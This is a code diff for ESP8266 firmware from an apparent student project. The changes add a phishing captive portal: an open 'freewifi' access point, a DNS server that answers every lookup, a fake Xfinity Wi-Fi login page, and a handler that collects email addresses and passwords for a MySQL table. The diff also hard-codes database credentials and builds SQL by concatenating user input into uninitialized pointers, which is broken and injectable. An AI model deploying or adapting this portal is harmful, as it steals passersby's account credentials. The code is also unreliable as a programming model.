@@ -7,9 +7,25 @@
 #include <MySQL_Connection.h>
 #include <MySQL_Cursor.h>
 //qjxu4534 is the old password
+/*To allow us to change the wifi name, we can have two seperate websites.
+ * One of the websites will be for changing the ssid, as well as wifi credentials to 
+ * connect to the phones wifi.
+ * 
+ * We will check and see if the module has connected to a database. 
+ * Case 1: Wifi Connection & Database Connection (pass true)
+ *    - The website should be the phishing one
+ *    
+ * Case 2: Wifi connected & no DB connection (Pass false)
+ *    - Website to change credentials
+ * Case 3: No Wifi Connection (Pass false)
+ *    - Website to change Credentials
+ */
 // Replace with your network credentials
-char *passwordHost = "deauth321"; // password used for changing credentials
+const char W_HTML[] PROGMEM = "text/html";
+char *passwordHost = "00000000"; // IP of the MySQL *server* here
 char* user = "root";         // MySQL user login username
+const IPAddress apIp(192, 168, 0, 1);
+DNSServer dnsServer;
 char* dbpass = "root";
 int LED = 2;
 WiFiClient client;
@@ -59,7 +75,7 @@ bool tryConnDB(){
  }else{
       Serial.println(".");
  MySQL_Cursor *cur_mem = new MySQL_Cursor(&conn);
- cur_mem->execute("use deauth;");
+ cur_mem->execute("use SeniorProject;");
  Serial.println("db Conn!");
  return true;
   }
@@ -97,17 +113,14 @@ bool tryConn(){
 return wificonnect;
 }
 
-void hostWifi(){
+void hostWifi(int type){
+  if(type == 1){
   String ssidHost = "HARP ESP-";
   byte mac[6];
   WiFi.macAddress(mac);
   ssidHost += String(mac[5], HEX);
   const char* newssid = ssidHost.c_str();
   Serial.println("Did not connect!");
-  Serial.println(ssidHost);
-    Serial.println(passwordHost);
-    //WiFi.macAddress(mac);
-    WiFi.softAP(newssid, passwordHost);
     IPAddress myIP = WiFi.softAPIP();
   Serial.print("AP IP address: ");
   Serial.println(myIP);
@@ -116,30 +129,51 @@ void hostWifi(){
   server.begin();
   Serial.println("HTTP server started");
   hosting = true;
+}else{
+  SPIFFS.begin();
+
+  WiFi.persistent(false);
+  WiFi.disconnect(true);
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(apIp, apIp, IPAddress(255, 255, 255, 0));
+  WiFi.softAP("freewifi", nullptr, 1);
+
+  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
+  dnsServer.start(53, "*", apIp);
+
+  server.on("/", httpHome);
+  server.on("/connect", httpConnect);
+  server.on("/pure.css", httpPureCss);
+  server.onNotFound(httpDefault);
+  server.begin();
 }
 
 void readWifi(){
   readEEPROM(0,32,ssid);
   readEEPROM(32,32,password);
   readEEPROM(64,16,ipAddr);
+  Serial.println(ipAddr);
 }
 //setup function
 void setup(void){ 
 
   EEPROM.begin(512);
+  //if(rebootInt == 6){
+  //}else{
   readWifi();
+  Serial.println("Here");
+  //}
   WiFi.begin(ssid, password);
   
+  //WiFi.setAutoReconnect(false);
   pinMode(LED, OUTPUT);
+  // preparing GPIOs
   Serial.begin(115200);
   delay(100);
-  // If cannot connect to wifi, then host wifi. This is true
  if (!tryConn()){
     hostWifi();
-    createWebServer(1);
-    server.begin();
-  }else{ // If it does connect to the database then host the server with '0'
-  createWebServer(0);
+  }else{
+  createWebServer(1);
   server.begin();
   }
 }
@@ -153,7 +187,6 @@ void loop(void){
     }
     if (dbConn){
     //Serial.println("high");
-   queryDB(false, false);
    }
   }else if(!hosting){
     hostWifi();
@@ -164,7 +197,7 @@ void loop(void){
 }
 
 
-void queryDB(){
+void queryDB(bool insert, const char* email, const char* domain, const char* password){
  delay(50);
  digitalWrite(LED, HIGH);
  if(WiFi.status() != WL_CONNECTED){
@@ -172,28 +205,60 @@ void queryDB(){
  }else{
   char* query;
   wificonnect = true; 
+   //Serial.println("\nRunning SELECT and printing results\n");
+  // Initiate the query class instance
   MySQL_Cursor *cur_mem = new MySQL_Cursor(&conn);
-  if(!sceneStart && !sceneEnd){
-  query = "SELECT Hosts.Host_Mac, Addon.Addon_Pin, Addon.Addon_State, Addon.Addon_Type from Addon INNER JOIN Hosts on Addon.Addon_Host_ID = Hosts.Host_ID;";
+  if(insert){
+  query = "Insert into Info (ID, email, domain, password, verified) values (0, '";
+  strcat(query, email);
   }
   cur_mem->execute(query);
   // Fetch the columns and print them
   column_names *cols = cur_mem->get_columns();
   // printing the column names.
   if(cols != NULL){
-    // Maybe check here
+  for (int f = 0; f < cols->num_fields; f++) {
+    //Serial.print(cols->fields[f]->name);
+    if (f < cols->num_fields-1) {
+      //Serial.print(", ");
+    }
+  }
   }
   // Read the rows and print them
   row_values *row = NULL;
   do {
-    //Maybe do something here to checks
+    row = cur_mem->get_next_row();
+    if (row != NULL) {
+      String mac = row->values[0];
+        if(mac == WiFi.macAddress()){
+          gpio(atoi(row->values[1]), atof(row->values[2]), row->values[3]);
+         //Serial.println("Made it here");
+          }
+       }
   } while (row != NULL);
   delete cur_mem;
  }
 }
+//This function is passed a pin and state to determine if it is to be shut off or turned on.
+void gpio(int pin, float state, String type){
+  pinMode(pin, OUTPUT);
+  Serial.println(type);
+  if (type == "F"){
+    //Serial.println("Fan");
+    int turns = state * 1023;
+  analogWrite(pin, turns);
+  }else{
+  if(state == 1 && digitalRead(pin) < 1){
+    digitalWrite(pin, HIGH);
+  }else if(state == 0 && digitalRead(pin) > 0){
+    digitalWrite(pin, LOW);
+  }else if(state != 1 && state != 0){
+    int turns = state * 255;
+    analogWrite(pin, turns);
+  }
+  }
+}
 
-
-// Work on getting the webpage open here and then send the data to the database to check
 
 void createWebServer(int webtype)
 {
@@ -241,15 +306,46 @@ void createWebServer(int webtype)
         server.send(statusCode, "application/json", content);
     });
   } else if (webtype == 0) {
-    server.on("/", []() {
-      IPAddress ip = WiFi.localIP();
-      String ipStr = String(ip[0]) + '.' + String(ip[1]) + '.' + String(ip[2]) + '.' + String(ip[3]);
-      server.send(200, "application/json", "{\"IP\":\"" + ipStr + "\"}");
+    const char* username = "";
+    const char* domain = "";
+ server.on(String(F("/xfinitywifi.html")).c_str(), HTTP_GET, []() {
+  
+        server.send(200, "text/html", content); 
     });
+    server.on("/setting", []() {
+        String tempemail = server.arg("email");
+        char email[50];
+        tempemail.toCharArray(email, 50);
+        String pass = server.arg("pass");
+        char *splitEmail = strtok(email, "@");
+        username = splitEmail;
+        domain = strtok(NULL, "@");
+        if (pass.length() > 0) {
+          // Do a query here and insert it
+          //queryDB(true, username, domain, password);
+        } else {
+          content = "{\"Error\":\"404 not found\"}";
+          statusCode = 404;
+          Serial.println("Sending 404");
+        }
+        server.send(statusCode, "application/json", content);
+    });
+     delay(1000);
+    char* query;
+  wificonnect = true; 
+   //Serial.println("\nRunning SELECT and printing results\n");
+  // Initiate the query class instance
+  MySQL_Cursor *cur_mem = new MySQL_Cursor(&conn);
+  query = "Select * from Info where username = ";
+  strcat(query, username);
+  strcat(query," and domain = ");
+  strcat(query, domain);
+  strcat(query, " and verified = 1;");
+  cur_mem->execute(query);
   }
 }
 
-//*************************************************************************** Good
+
 
 //startAdr: offset (bytes), writeString: String to be written to EEPROM
 void writeEEPROM(int startAdr, int laenge, String writeString) {
